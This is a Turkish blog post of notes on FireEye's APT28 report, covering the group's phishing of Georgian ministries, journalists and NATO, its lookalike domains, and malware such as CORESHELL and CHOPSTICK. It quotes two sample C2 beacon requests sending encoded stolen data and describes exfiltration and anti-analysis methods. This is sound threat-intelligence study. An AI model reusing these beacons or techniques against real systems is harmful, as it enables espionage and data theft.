---
layout: post
title:  APT28 ve Rusya'nın Siber İstihbarat Operasyonları [Siber Güvenlik]
date:   2022-04-03 12:00:00 +0000
categories: cevizlab
---

Bu yazı, **FireEye**'ın **APT28: A Window Into Russia’s Cyber Espionage Operations?** pdf'inden aldığım notlardan oluşuyor. Orijinaline erişmek için lütfen [tıklayın!](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-apt28.pdf)

---

## Neden?

**MITRE ATT&CK** bakınmam gerekti. Deniz derya... İçinde kaybolmamak ve saldırılara dair anlayışımı kuvvetlendirmesi için yazılmış raporlara göz atmak istedim ve yukarıda bahsettiğim **pdf**'i seçtim. Okurken aldığım notlar bu yazıyı oluşturdu.

---
---

## APT28'in NATO, Doğu Avrupa ve Kafkasya İlgisi

**APT28 siber istihbarat (cyber espionage) odaklı bir grup.** Bu sebeple pek çok domain kiralamış, oltalama epostaları ve bu epostalara eklenecek içinde **zararlı kod** barındıran **sahte dokümanlar** hazırlamış.

![APT28 Targets 1](/assets/img/apt28-targets-1.jpg "APT28 Targets 1")

![APT28 Targets 2](/assets/img/apt28-targets-2.jpg "APT28 Targets 2")

### Gürcistan İçişleri Bakanlığı'nın (MIA) Hedeflenmesi

APT28, geliştirdikleri zararlı yazılımları belirli ortamlara göre uyarlıyor. Örneğin, hedeflerinin eposta sunucusunu kullanarak veri çalıyorlar. Örneğin; içinde Gürcü ehliyet numaraları olan sahte ve **zararlı yazılım içeren bir belge**. Bu belgedeki **arka kapı (bakcdoor)** şunları yapmaya çalışıyor:

**Gürcistan İçişleri Bakanlığı**'yla alakalı bir eposta sunucusuyla iletişime geçip @mia.ge.gov uzantılı eposta adresleri aracılığıyla bağlantı kurmayı deniyor. Arka kapı, sunucuyla bağlantı kurduğunda, epostanın konu kısmına Gürcüce sürücü ehliyetleriyle alakalı bir metin yazıyor, elde ettiği sistem keşif bilgilerini içeren bir dosya maile ekliyor.

Bu şekilde bir sızdırma girişimi, normal görünen bir yoldan ilerleyen normal bir trafiğe dikkat edilmesini zorlaştırıyor.

Diğer bir örnek ise şu:

**Gürcistan, Tiflis, Ortachala** semtine ithafen "MIA Users\Ortachala" referansları içeren **Bilgi Teknolojileri** temalı sahte bir belge. Bu belge, kurum adı olarak "**MIA**" yani **İçişleri Bakanlığı**'nı, yazar olarak "**Beka Nozadze**" isimli sistem yöneticisini, içerik olarak da **Windows XP ve 7** sistemleri için **domain ve kullanıcı grubu kurulum bilgileri** içeriyor. Böyle bir belge tüm **İçişleri Bakanlığı sistem kullanıcıları** için meşru görünür ve bu sayede içinde yer alan zararlı yazılımın çalıştırılması sağlanır.

![APT28 Gürcü BT Oltalaması](/assets/img/apt28-georgian-it-phishing.jpg "APT28 Gürcü BT Oltalaması")

### Gürcistan Savunma Bakanlığının (MOD) Hedeflenmesi

**Gürcistan Savunma Bakanlığı**, onları eğiten **Amerikalı** bir **savunma müteahhidi** üzerinden hedef alınıyor.

APT28, Amerikalı savunma müteahhidi ve Gürcistan Savunma Bakanlığı ortak çalışma grubundakilerin doğum günlerini içeren fakat içinde **SOURFACE** zararlı yazılım indiricisini içeren sahte bir belge ile saldırıyor.

### Kafkasya'dan Haber Veren Bir Gazetecinin, Ermenistan'ın ve Doğu Avrupa'nın Hedeflenmesi

Gazetecileri hedef almak, APT28'e ve sponsorlarına kamuoyunu izleme, muhalifleri belirleme, dezenformasyon yayma veya daha fazla hedeflemeyi kolaylaştırma yolu sağlayabilir.

Şöyle bir olay yaşanmış:

**Reason Magasine** dergisi, Amerika kökenli. Bu derginin Kafkasya Sorunları Departmanı'nda çalışan bir baş yöneticiden geliyor gibi görünen, hedeflediği gazeteciye ilk ismiyle hitap eden ve ondan fikirleriyle birlikte kimlik bilgilerini de isteyen ama arka planda hedeflenen gazetecinin sistemine **SOURFACE** **arka kapı** yazılımını yerleştiren sahte bir belge ile saldırı düzenleniyor.

|APT28 Domaini|Gerçek Domain|
|---|---|
|kavkazcentr.info|kavkazcenter.com (Uluslararası İslami Haber Ajansı)|
|rnil.am|mil.am (Ermenistan Ordusu)|
|standartnevvs.com|standartnews.com (Bulgar Standart News Websitesi)|
|novinitie.com, n0vinite.com|novinite.com (Bulgar Sofia News Ajansı)|
|qov.hu.com|gov.hu (Macar Hükümeti)|
|q0v.pl, mail.q0v.pl|gov.pl, mail.gov.pl (Polonya Hükümeti)|
|poczta.mon.q0v.pl|poczta.mon.gov.pl (Polonya Savunma Bakanlığı)|

### NATO ve Diğer Avrupa Güvenlik Organizasyonlarının Hedeflenmesi

Saldırılardan **NATO** da nasibini almış. Saldırıda kullanılacak sahte domainler ve oltalama epostası ekleri içeriği örnekleri şunlar:

|APT28 Domaini|Gerçek Domain|
|---|---|
|nato.nshq.in|nshq.nato.int (NATO Special Operations HQ)|
|natoexhibitionff14.com|natoexhibition.org (NATO Future Forces 2014 Sergi ve Konferansı)|
|login-osce.org|osce.org (Organization for Security and Cooperation in Europe)|

![APT28 NATO Oltalaması](/assets/img/apt28-nato-phishing.jpg "APT28 NATO Oltalaması")

![APT28 NATO Oltalaması Konu Başlıkları](/assets/img/apt28-nato-phishing-mail-subjects.jpg "APT28 NATO Oltalaması Konu Başlıkları")

![APT28 NATO UK](/assets/img/apt28-uk-army.jpg "APT28 NATO UK")

![APT28 NATO TR](/assets/img/apt28-tr-army.jpg "APT28 NATO TR")

---

## Yetenekli Rus Geliştiriciler

APT28, **uzun vadeli kullanım ve çok yönlülük** için tasarlanmış araçlar oluşturan ve kafa karıştırmak için çaba sarf eden bir grup. Yazdıkları zararlı yazılımlar, taşınabilir çalıştırılabilir (**PE: Portable Executable**) dosyalar olup çeşitli karşı analiz yetenekleri içeriyor. Örneğin; analiz ortamını belirlemek için çalışma zamanı (runtime) kontrolleri, çalışma zamanında (runtime) paketten çıkarılan karıştırılmış stringler, kullanılmayan makine talimatları... Bunlar, analizi yavaşlatıyor.

### SOURFACE / CORESHELL

![SOURFACE Deployment Ecosystem](/assets/img/apt28-sourface-deployment-ecosystem.jpg "SOURFACE Deployment Ecosystem")

İndirici (downloader). Örneğin, **oltalama** epostalarına ekli sahte dokümanlar açıldığında çalışır ve **C2** sunucusuna bağlanarak ikinci seviye (**second stage**) bir arka kapı indirir.

**CORESHELL**, **SOURFACE**'in güncellenmiş halidir ve kullanılmayan makine talimatları (**unused machine instructions**) aracılığıyla **tersine mühendislik (reverse engineering)** zorlaştırma taktiklerini içeriyor. Bu, **disassembly** sırasında büyük miktarda gereksiz gürültü yaratarak CORESHELL davranışının **statik** analizini engelliyor. Bunun yanında çalışma zamanı (**runtime**) kontrolleri yaparak bir analiz ortamında yürütülüp yürütülmediğini belirlemeye çalışıyor ve eğer öyleyse, yüklerini çalıştırmıyor.

**CORESHELL** görevini yapmak için iki **iş parçacığı (thread)** kullanıyor. İlki, erişilen sistemin process listesini gönderiyor. İkincisi, ikinci aşama faydalı yükleri (payload) indirip yüklüyor.

Mesajlar, gövdeleri şifrelenmiş ve **Base64** ile kodlanmış veriler içeren **HTTP POST** istekleri kullanılarak gönderiliyor. Bu işlemler için sistemdeki **Internet Explorer** kullanıcı aracısı dizesini (**user agent string**) kullanılıyor.

```
POST /check/ HTTP/1.1
User-Agent: MSIE 8.0
Host: adawareblock.com
Content-Length: 58
Cache-Control: no-cache
zXeuYq+sq2m1a5HcqyC5Zd6yrC2WNYL989WCHse9qO6c7powrOUh5KY=
```

### EVILTOSS

Bu arka kapı; keşif, izleme, kimlik bilgisi hırsızlığı ve kabuk kodu yürütme için, sistem erişimi elde etmek için **SOURFACE** indiricisi aracılığıyla yükleniyor.

### OLDBAIT

Kendisini `%ALLUSERPROFILE%\Application Data\ Microsoft\MediaPlayer\` içine `updatewindws.exe` ('o' yok!) olarak kuran bir kimlik bilgisi toplayıcı.

Şu uygulamalara erişebiliyor:

![Apps detected by CHOPSTICK](/assets/img/apt28-apps-detected-by-chopstick.jpg "Apps detected by CHOPSTICK")

### CHOPSTICK

Metodik ve çalışkan kodlayıcıların eseri. **C++** ile yazılmış, modülerleştirilmiş, **nesne yönelimli** bir çerçeve kullanan, özel işlevsellik ve esneklik sağlayan bir arka kapı. Bu çerçeve, ortak bir kod tabanını paylaşan kötü amaçlı yazılım türevleri arasında çok çeşitli yeteneklere izin veriyor. **CHOPSTICK**, **SMTP** veya **HTTP** kullanarak harici sunucularla iletişim kurabiliyor.

**CHOPSTICK**'in modülerliği, esnek ve dayanıklı platformu, uzun vadeli kullanım ve çok yönlülük için planlandığını gösteriyor. Hedef ortama göre kodlanan zararlı, **eposta sunucuları** gibi yerel ağ kaynaklarını kullanmak üzere hazırlanmış.

Tüm aile **RSA** kullanıyor.

Modülerliğini açacak olursak, gerektiğinde farklı yeteneklere sahip varyantları derlemek için esnek seçeneklere ve çalışma zamanında ek yetenekler dağıtmaya olanak tanıyor. Bu, hedef ortam için özel implantlar hazırlayabilmeyi sağlıyor.

Şu şekillerde veri çıkarıyor.

+ HTTP kullanarak C2 ile iletişim.
+ Eposta sunucusu ile veri (klavye verisi, ofis dokümanları, PGP anahtarları) gönderimi.
+ Airgap ağlardan veri çıkarmak için yerel dizinler, registry ve USB disklere kopyalama.

Çalışma adımları şöyle:

+ Üzerinde çalıştığı sisteme dair verileri topladıktan sonra, bunları `%ALLUSERSPROFILE%` altında geçici bir dosya olarak (**tmp**) tutuyor.
+ **Process**'ler arası veri taşıma mekanizması olan **[Windows MailSlot](https://en.wikipedia.org/wiki/MailSlot)**'u oluşturarak buraya **CHOPSTICK** harici zararlıların elde ettiği verileri **encrypt** ederek yerleştiriyor.
+ Üzerinde çalıştığı sistemdeki kullanıcıların klayve tuşlamalarını (**keylogger**), ekran görüntülerini (**screenlogger**), Windows içeriklerini (metin, context, menu vs.) 500 milisaniyede bir **HTML** benzeri bir formatta kaydediyor.
+ Kayıtlı verileri **RC4**'le **encrypt** ediyor ve geçici bir dosyaya (**tmp**) yazıyor.
+ Çalışmaya başladıktan 60 saniye sonra **C2** sunucusu ile **HTTP** üzerinden iletişime geçerek sunucunun yanıt dönmesini beklemeden verileri yüklüyor, yükleme tamamlanınca yüklediği verileri sistemden siliyor.

Örnek **HTTP POST** isteği:

```
POST /search/?btnG=D-3U5vY&utm=79iNI&ai=NPVUnAZf8FneZ2e_qptjzwH1Q&PG3pt=n-
B9onK2KCi HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.; WOW64; rv:20.0) Gecko/20100101
Firefox/20.0
Host: windows-updater.com
Content-Length: 77
Cache-Control: no-cache
1b2x7F4Rsi8_e4N_sYYpu1m7AJcgN6BzDpQYv1P2piFBLBqghXiHY3SIfe8cUHHYojeXfeyyOhw==
```

## Rusya'yı İşaret Eden Bulgular

Zararlı yazılımların derlenme (**compile**) zamanları **Moskova** ve **St. Petersburg**'un iş saatleri (Pazartesi - Cuma, 08.00 - 18.00 arası) içinde. Bunun yanında bakılan bir diğer yer de şu: **Portable Executable (PE)** kaynağı "**locale**" denen dil tanımlayıcısını da içerir. Görünen o ki bu zararlı yazılımları, sisteminde **Rusça** dili tanımlı birileri kodlamış.

![APT28 TimeZone](/assets/img/apt28-timezone.jpg "APT28 TimeZone")

![APT28 Locale](/assets/img/apt28-locale-lang.jpg "APT28 Locale")
